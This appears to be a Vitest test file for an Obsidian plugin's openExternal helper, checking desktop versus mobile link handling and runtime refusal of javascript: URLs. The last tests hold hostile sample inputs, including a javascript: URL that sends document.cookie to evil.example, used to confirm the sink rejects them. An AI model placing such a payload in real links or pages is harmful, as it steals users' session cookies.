// @vitest-environment jsdom
import { afterEach, describe, expect, it, vi } from "vitest";
import { asTrustedUrl } from "../../src/sync/safe-url";
import { openExternal } from "../../src/ui/external-link";
import { Platform, stubApp } from "../stubs/obsidian";

/**
 * `src/ui/external-link.ts` had zero test references, and the double is why: it exported
 * `Platform = { isMobile: false }` while this file branches on `Platform.isDesktop`. That read
 * `undefined` — falsy — so a test would have taken the MOBILE arm every time and passed while proving
 * the opposite of its own name. The first assertion below is the one that would have been inverted.
 *
 * ⚠️ `window.open` is stubbed rather than allowed: jsdom implements it as a not-implemented error, and
 * an unstubbed call would make the desktop test fail for a reason unrelated to what it checks.
 */
const SIGN_IN = asTrustedUrl("https://copal.uk/plugin/connect?state=abc");

let restorePlatform: (() => void) | undefined;
afterEach(() => {
	restorePlatform?.();
	restorePlatform = undefined;
	vi.restoreAllMocks();
	// ⚠️ jsdom's document is shared across every test in the file, and an opened Modal attaches itself
	// to it. Without this, "renders no anchor" finds the PREVIOUS test's anchor and passes or fails for
	// the wrong reason — which it did, until this line existed.
	document.body.empty();
});

describe("openExternal on desktop", () => {
	it("uses window.open and presents NO modal", () => {
		// ⛔ The assertion the broken double would have inverted.
		expect(Platform.isDesktop, "the double must model the key this file actually reads").toBe(true);
		const open = vi.spyOn(window, "open").mockReturnValue(null);
		const app = stubApp();

		openExternal(app, SIGN_IN);

		expect(open).toHaveBeenCalledWith(SIGN_IN, "_blank");
		expect(
			document.querySelector(".copal-continue-btn"),
			"desktop must not interpose a tap prompt",
		).toBe(null);
	});
});

describe("openExternal on mobile", () => {
	it("renders a real <a href> instead of calling window.open", () => {
		// The whole reason this branch exists: the authorize URL is built after several awaits, so the
		// original tap gesture is gone and a mobile WebView silently blocks a non-gesture window.open.
		// Only a real anchor the user taps counts as a gesture.
		restorePlatform = Platform.__setMobile(true);
		const open = vi.spyOn(window, "open").mockReturnValue(null);
		const app = stubApp();

		openExternal(app, SIGN_IN);

		expect(open, "a non-gesture window.open is silently blocked on mobile").not.toHaveBeenCalled();
		const link = document.querySelector<HTMLAnchorElement>(".copal-continue-btn");
		expect(link, "the tap target must be a real anchor").not.toBe(null);
		expect(link?.tagName).toBe("A");
		expect(link?.getAttribute("href"), "a real href is what Obsidian's link handler opens").toBe(
			SIGN_IN,
		);
		expect(link?.getAttribute("target")).toBe("_blank");
		expect(link?.getAttribute("rel")).toBe("noopener");
	});

	it("explains what to do, so the prompt is not a bare link", () => {
		restorePlatform = Platform.__setMobile(true);
		vi.spyOn(window, "open").mockReturnValue(null);
		openExternal(stubApp(), SIGN_IN);
		expect(document.body.textContent ?? "").toMatch(/return to Obsidian/i);
	});
});

describe("the executing sink is checked at runtime", () => {
	it("refuses a javascript: URL even when the type says it was already vetted", () => {
		// This is the one place in the plugin where a URL is EXECUTED rather than fetched, and
		// `javascript:` reaches both `window.open` and the mobile branch's real `href`. The TrustedUrl
		// type is erased at runtime, so the check cannot rely on every future caller being in TS's reach.
		const open = vi.spyOn(window, "open").mockReturnValue(null);
		const hostile = "javascript:fetch('https://evil.example/'+document.cookie)" as ReturnType<
			typeof asTrustedUrl
		>;
		expect(() => openExternal(stubApp(), hostile)).toThrow();
		expect(open, "nothing may be executed before the check").not.toHaveBeenCalled();
	});

	it("refuses a javascript: URL on the mobile branch too, rendering no anchor", () => {
		restorePlatform = Platform.__setMobile(true);
		const hostile = "javascript:alert(1)" as ReturnType<typeof asTrustedUrl>;
		expect(() => openExternal(stubApp(), hostile)).toThrow();
		expect(
			document.querySelector(".copal-continue-btn"),
			"a hostile URL must never reach a real href",
		).toBe(null);
	});
});
